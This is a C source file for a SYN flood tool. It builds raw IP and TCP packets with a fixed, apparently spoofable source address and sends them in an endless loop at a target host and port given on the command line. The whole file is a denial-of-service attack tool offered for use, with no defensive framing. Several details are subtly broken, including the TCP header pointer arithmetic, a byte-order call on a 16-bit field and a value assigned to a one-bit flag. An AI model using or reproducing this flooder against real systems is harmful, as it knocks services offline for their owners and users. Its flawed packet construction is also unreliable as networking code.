#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <string.h>
#include <stdlib.h>

#define URG 32
#define ACK 16
#define PSH 8
#define RST 4
#define SYN 2
#define FIN 1

struct ipheader {
    unsigned char iph_ihl:5, iph_ver:4;
    unsigned char iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    unsigned char iph_flags;
    unsigned short int iph_offset;
    unsigned char iph_ttl;
    unsigned char iph_protocol;
    unsigned short int iph_chksum;
    unsigned int iph_sourceip;
    unsigned int iph_destip; 
};

struct tcpheader {
    unsigned short int tcph_src;
    unsigned short int tcph_dest;
    unsigned int tcph_seqnum;
    unsigned int tcph_acknum;
    unsigned char tcph_reserved:4, tcph_offset:4;
    unsigned int tcp_res1:4, //little endian 
        tcph_hlen:4, //length of header 32-bit
        tcph_fin:1, //finish flag
        tcph_syn:1, //Synchronize flag
        tcph_rst:1, //Reset flag
        tcph_psh:1, //Push flag
        tcph_ack:1, //acknowledge
        tcph_urg:1, //urgent pointer
        tcph_res2:2;

    unsigned short int tcph_win;
    unsigned short int tcph_chksum;
    unsigned short int tcph_urgptr;
};

unsigned short csum(unsigned short *buffer, int nwords) {
    unsigned long sum;
    for(sum = 0; nwords > 0; nwords--)
        sum += *buffer++;
    sum = (sum>>16)+(sum&0xffff);
    sum += (sum>>16);
    return (unsigned short)(~sum);
}

int main(int argc, char *argv[]) {
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP); //Opens socket
    //buffer will contain iph and tcph and payload

    char datagram[4096];
    struct ipheader *iph = (struct ipheader *)datagram;
    struct tcpheader *tcph = (struct tcpheader *)datagram+sizeof(struct ipheader);
    struct  sockaddr_in sin;

    if(argc != 3) {
        printf("Invalid parameters!\n");
        printf("Usage: %s <Target IP/hostname> <port to be flooded>\n", argv[0]);
        exit(-1);
    }

    unsigned int floodport = atoi(argv[2]);

    sin.sin_family = AF_INET;

    sin.sin_addr.s_addr = inet_addr(argv[1]);
    memset(datagram, 0, 4096);

    iph->iph_len = sizeof(struct ipheader) + sizeof(struct tcpheader);

    //vals don't matter
    iph->iph_ident = htonl(54321);
    iph->iph_offset = 0;
    iph->iph_ttl = 255;
    iph->iph_protocol = 6; //upper layer

    iph->iph_chksum = 0; //set zero before computation

    //can spoof ip here

    iph->iph_sourceip = inet_addr("192.168.3.100"); //random for now

    iph->iph_destip = sin.sin_addr.s_addr;

    //random port
    tcph->tcph_src = htons(5678);
    tcph->tcph_dest = htons(floodport);

    //SYN packets have a random sequence but may change for other packets
    tcph->tcph_seqnum = random();

    //Number and ACK seq is 0 in initial packet

    tcph->tcph_ack = 0;
    tcph->tcph_acknum = 0;
    //first and only tcp seg
    tcph->tcph_offset = 0;
    
    tcph->tcph_syn = 0x02;

    tcph->tcph_win = htonl(6553); //max allowed

    //chksum of 0 lets kernel fill in during transmission

    tcph->tcph_chksum = 0;
    tcph->tcph_urgptr=0;

    iph -> iph_chksum = csum ((unsigned short *)datagram, iph->iph_len >> 1);

    //IP_HDRINCL call tells kernel that header is part of the data and doesn't add its own header

    int tmp = 1;
    const int *val = &tmp;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0 ) {
        printf("Error: setsockopt() --Cannot set HDRINCL \n");
        exit(-1);
    } else {
        printf("Using cusom header\n");
    }

    while(1) {
        if(sendto(s, //socket
            datagram, //buffer w/ headers and data
            iph->iph_len, //total len of datagram
            0, //routing flags (typically 0)
            (struct sockaddr *)&sin, //socket addr
            sizeof(sin)) < 0) 
            printf("sendto() error");
        else 
            printf("Flooding %s at %u...\n", argv[1], floodport);
    }
    return 0;
}